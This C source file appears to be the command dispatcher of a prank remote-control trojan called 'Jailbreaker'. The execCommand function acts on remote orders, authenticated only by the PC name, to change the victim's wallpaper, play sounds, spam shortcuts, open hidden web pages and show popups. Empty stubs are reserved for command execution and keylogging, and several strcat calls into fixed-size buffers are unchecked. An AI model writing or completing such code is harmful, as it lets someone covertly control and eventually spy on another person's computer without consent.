#include "Funnies.h"
#include "Link.h"

WINBOOL changeWallpaper(char *img) {
    if(!img) {
        JBlogErr("Not enough arguments");
        return 0;
    }

    char path[MAX_PATH] = "res\\";
    strcat(path, img);

    return SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, path, SPIF_UPDATEINIFILE);
}
/*
Use DMDO_X macro or number between 0 - 3 (inclusive)
    Default - 0
    90      - 1
    180     - 2
    270     - 3
*/
LONG ChangeRotation(DWORD Orient) {
    DEVMODE mode;

    EnumDisplaySettingsA(NULL, ENUM_CURRENT_SETTINGS, &mode);
    if (mode.dmFields | DM_DISPLAYORIENTATION)
    {
        mode.dmDisplayOrientation = Orient;
        return ChangeDisplaySettings(&mode, 0);
    }
    return -1;
}


void openLink(const char *site) {
    char url[256] = "www."; // i aint typin' www. everytime
    strcat(url, site);

    ShellExecuteA(NULL, "open", url, NULL, NULL, SW_HIDE);
}


const char *PCName;
static char wallpaper[MAX_PATH] = BADPATH;

void popupW(char *argz) {
    wchar_t wargz[CMD_ARGSZ];
    wchar_t *ptr;
    MultiByteToWideChar(CP_UTF8, 0, argz, -1, wargz, CMD_ARGSZ); // turn argz to wchar and put it in wargz
    
#ifndef TELTHAR_STUPID_WIDE_CHAR
    wchar_t *arg1 = wcstok(wargz, SEPL);
    wchar_t *arg2 = wcstok(NULL, SEPL);
#else
    /* For later generations */
    
    //wchar_t *arg1 = _wcstok_s_l(wargz, SEPL, &ptr, TELTHAR_STUPID_WIDE_CHAR);
    //wchar_t *arg2 = _wcstok_s_l(NULL, SEPL, &ptr, TELTHAR_STUPID_WIDE_CHAR);

    unsigned char *_arg1 = _mbstok(argz, SEPC);
    unsigned char *_arg2 = _mbstok(NULL, SEPC);

    wchar_t *arg1, *arg2;
    int one = mbstrlen(_arg1);
    int two = mbstrlen(_arg2);

    arg1 = calloc(one, 1);
    arg2 = calloc(two, 1);

    MultiByteToWideChar(CP_UTF8, 0, _arg1, -1, arg1, one);
    MultiByteToWideChar(CP_UTF8, 0, _arg2, -1, arg2, two);
#endif

    if(!arg1) {
        JBlog("Not enough arguments");
        return;
    }

    MessageBoxW(NULL, arg1, arg2 ? arg2 : L"JB", 0);
}


void popupA(char *argz) {
    char *arg1 = strtok(argz, SEP);
    char *arg2 = strtok(NULL, SEP);
    
    if(!arg1) {
        JBlogErr("Not enough arguments");
        return;
    }

    MessageBoxA(NULL, arg1, arg2 ? arg2 : "JB", 0);
}


void CreateLinksSubr(char *argz) {
    char *arg1 = strtok(NULL, SEP);
    CreateLinks(arg1 ? atoi(arg1) : 100);
}


void execCommand(JBCMD cmd)
{
    // If strings are different then fail.
    if (strcmp(cmd.auth, PCName)) {
        JBlogErr("Auth failed.");
        return;
    }
    
    switch (cmd.cmd)
    {
    /* --- Templates --- */
    case JB_FUN:
        CreateLinks(180);
        changeWallpaper("res\\jail.png");
        PlaySound("res\\Stalker.mp3", NULL, SND_FILENAME | SND_ASYNC);
        break;
    case JB_DEACTIVE:
        JBlog("Jailbreaker deactivated.");
        exit(0);
        break;
    case JB_REMOVE:
        // you should uninstall yourself NOW!!!
        break;

    /* --- Sounds --- */
    case JB_VOLUME:
        waveOutSetVolume(NULL, atoi(cmd.args)); // deprecated
        break;
    case JB_SZAMBO:
        // path up to change
        PlaySound(cmd.args, NULL, SND_FILENAME | SND_ASYNC);
        break;

    /* --- Wallpaper --- */
    case JB_SETWALL:
        changeWallpaper(cmd.args);
        break;
    case JB_SAVEWALL:
        memcpy(wallpaper, cmd.args, CMD_ARGSZ > MAX_PATH ? MAX_PATH : CMD_ARGSZ);   // Use the smaller value, 256 < 260 then use 256, 512 > 260 then use 260
        break;
    case JB_LOADWALL:
        if (!strcmp(wallpaper, BADPATH)) {
            JBlogErr("No saved wallpaper");
            break;
        }
        changeWallpaper(wallpaper);
        break;

    /* --- Shortcuts --- */
    case JB_LINKMAKE:
        CreateLinksSubr(cmd.args);
        break;
    case JB_LINKDEL:
        RemoveLinks();
        break;

    /* --- Other --- */
    case JB_OPENWEB:
        openLink(cmd.args);
        break;
    case JB_CDEJECT:

        break;
    case JB_POPUPA:
        popupA(cmd.args);
        break;
    case JB_POPUPW:
        popupW(cmd.args);
        break;
    case JB_EXEC:

        break;
    case JB_ROTATESCR:

        break;
    case JB_CHANGERES:

        break;
    case JB_LOGKEYS:

        break;

    default:
        JBlogErr("Unknown command");
        printf("cmd=%u\n", cmd.cmd);
        break;
    }
}